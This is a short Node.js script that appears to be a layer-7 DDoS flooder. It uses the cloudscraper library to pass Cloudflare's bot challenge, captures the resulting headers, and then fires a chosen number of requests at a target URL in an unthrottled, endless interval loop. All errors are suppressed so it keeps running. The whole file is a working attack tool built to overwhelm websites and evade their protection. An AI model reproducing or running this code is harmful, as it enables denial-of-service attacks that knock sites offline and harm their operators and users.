const cloudscraper = require("cloudscraper")
if(process.argv.length !== 4){
console.log("Bypass By Cung ! <3")
}else{
var url = process.argv[2];
var req = process.argv[3];
function raw(){
var option = {
url:url,
resolveWithFullResponse: true
}
let get = new Promise(function(resole,reject){
cloudscraper.get(option,function(err,res){
if(err){
return console.log("Error")}
var r  = res.request.headers
resole(r)
})
})
get.then(function(r){
for (let i=0;i<req;i++){
cloudscraper({
url:url,
headers:r,
followAllRedirects: false
},function(err,res){
if(err){
console.log(err.message)
}
console.log(r)
})
}
})
}
setInterval(()=>{
raw()
})
}
process.on('uncaughtException', function (err) {

});
process.on('unhandledRejection', function (err) {

});
